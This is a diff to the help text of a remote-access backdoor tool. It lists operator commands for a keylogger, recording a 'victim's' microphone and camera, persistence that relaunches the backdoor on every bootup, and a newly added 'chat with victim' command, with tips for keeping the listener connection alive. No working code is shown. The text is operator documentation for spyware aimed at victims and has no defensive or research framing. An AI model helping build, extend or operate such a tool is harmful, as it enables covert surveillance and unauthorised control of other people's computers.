@@ -1,8 +1,10 @@
 	Keylogger is active.You can go 'keylogger commands' to keylogger related commands.
-	Recording the victim's microphone(if you didn't cancel it.).You can go 'camera and sounds commands' to microphone and camera related commands.
+	Recording the victim's microphone(if you didn't cancel it from code.).You can go 'camera and sounds commands' to microphone and camera related commands.
 	Permanance is activated since it opened(If you didn't use 'remove_permanance' command).
         This backdoor will run every time the victim's bootup.(If you want to deactive it,use the 'remove_permanance' command)
 	If you quit with 'CTRL+C' you can't connect until the victim's bootup.So,you should quit with 'exit' command to connect victim again. 
+	If you used the 'chat' command and you want to exit from chat,please print 'exit' on chat and send message.Then go to your listener terminal and press
+	CTRL+C.So,your connection won't disconnect.You can reconnect your listener.
 
 	Functional commands :																	
 		  |
@@ -12,7 +14,7 @@
 
 	exit													clear
 	▲													▲
-	╰──▶ Exiting program.(without disconnected.)							        ╰──▶ Cleans up the terminal.
+	╰──▶ Disconnected and exiting program.									╰──▶ Cleans up the terminal.
 
 	system													talk
 	▲													▲
@@ -29,10 +31,10 @@
 	▲													▲
 	╰──▶ Removes the permanance.										╰──▶ Shows this message.
 
-	permanance
-	▲
-	╰──▶ Activates permanance.
-
+	permanance												chat
+	▲													▲
+	╰──▶ Activates permanance.										╰──▶ Chat with victim.(Please read the line about
+														'chat' in help command before you use this command.)
 
 	 
 	Directory/file commands : 
